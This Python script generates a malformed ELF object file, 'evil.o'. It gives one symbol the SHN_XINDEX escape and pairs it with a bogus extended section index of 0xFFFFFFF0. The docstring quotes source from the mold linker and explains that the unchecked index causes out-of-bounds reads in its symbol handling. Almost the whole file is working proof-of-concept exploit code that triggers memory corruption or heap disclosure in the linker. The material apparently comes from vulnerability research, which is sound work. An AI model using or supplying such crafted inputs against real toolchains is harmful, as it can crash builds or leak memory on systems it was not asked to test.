#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object whose .symtab contains one local
STT_SECTION symbol using the SHN_XINDEX (0xffff) escape, paired with a
SHT_SYMTAB_SHNDX section whose corresponding entry is a huge, fully bogus
"real" section index (0xFFFFFFF0).

src/mold.h, ObjectFile<E>::get_shndx():
    if (esym.st_shndx == SHN_XINDEX)
        return symtab_shndx_sec[&esym - &this->elf_syms[0]];   // returned as-is
    if (esym.st_shndx >= SHN_LORESERVE)
        return 0;
    return esym.st_shndx;

The returned index is never checked against elf_sections.size()/sections.size().
src/input-files.cc, ObjectFile<E>::initialize_local_symbols() then does:
    i64 shndx = get_shndx(esym);
    if (InputSection<E> *isec = sections[shndx]) { ... }        // OOB vector index
    else { name = ... elf_sections[shndx].sh_name; }            // OOB span index
    ...
    sym.set_input_section(sections[get_shndx(esym)]);           // OOB vector index again

This object has exactly 5 sections (elf_sections.size() == 5) and a .symtab
with 2 entries (null symbol + our malicious local STT_SECTION symbol, so
first_global == 2, no global symbols to worry about). The SHT_SYMTAB_SHNDX
section has 2 matching u32 entries: 0 for the null symbol, 0xFFFFFFF0 for the
malicious one - a maximally huge attacker-controlled index (not just
one-past-the-end), per this project's own accumulated lesson that a merely
moderate bad index into a small std::vector-backed container can silently
read adjacent live heap data without crashing at all.
"""
import struct
import sys

SHT_SYMTAB = 2
SHT_STRTAB = 3
SHT_SYMTAB_SHNDX = 18

STT_SECTION = 3
STB_LOCAL = 0

SHN_XINDEX = 0xffff
BOGUS_SHNDX = 0xFFFFFFF0  # far larger than this object's 5 real sections


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info,
                        addralign, entsize)


def sym(name, info, other, shndx, value, size):
    return struct.pack("<IBBHQQ", name, info, other, shndx, value, size)


def build() -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_symtab = addname(".symtab")
    n_strtab = addname(".strtab")
    n_shstrtab = addname(".shstrtab")
    n_symtab_shndx = addname(".symtab_shndx")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    strtab_data = b"\x00"

    sym_null = sym(0, 0, 0, 0, 0, 0)
    sym_evil = sym(0, (STB_LOCAL << 4) | STT_SECTION, 0, SHN_XINDEX, 0, 0)
    symtab_data = sym_null + sym_evil

    shndx_data = struct.pack("<II", 0, BOGUS_SHNDX)

    # Section indices (fixed layout, 5 sections total):
    #   0 NULL, 1 .symtab, 2 .strtab, 3 .shstrtab, 4 .symtab_shndx
    IDX_SYMTAB = 1
    IDX_STRTAB = 2
    IDX_SHSTRTAB = 3
    IDX_SYMTAB_SHNDX = 4

    off = EHDR_SIZE
    off_symtab = off
    off += len(symtab_data)
    off_strtab = off
    off += len(strtab_data)
    off_shstrtab = off
    off += len(names)
    off_symtab_shndx = off
    off += len(shndx_data)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_symtab = shdr(n_symtab, SHT_SYMTAB, 0, 0, off_symtab, len(symtab_data),
                      IDX_STRTAB, 2, 8, 24)  # sh_info=2 -> first_global=2 (no globals)
    sh_strtab = shdr(n_strtab, SHT_STRTAB, 0, 0, off_strtab, len(strtab_data), 0, 0, 1, 0)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)
    sh_symtab_shndx = shdr(n_symtab_shndx, SHT_SYMTAB_SHNDX, 0, 0, off_symtab_shndx,
                            len(shndx_data), IDX_SYMTAB, 0, 4, 4)

    e_ident = bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        62,         # e_machine = EM_X86_64
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        EHDR_SIZE,
        0, 0,       # e_phentsize, e_phnum
        SHDR_SIZE,
        5,            # e_shnum
        IDX_SHSTRTAB,  # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + symtab_data + strtab_data + names + shndx_data + b"\x00" * pad +
            sh_null + sh_symtab + sh_strtab + sh_shstrtab + sh_symtab_shndx)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())
    print(f"wrote {out_path}")


if __name__ == "__main__":
    main()
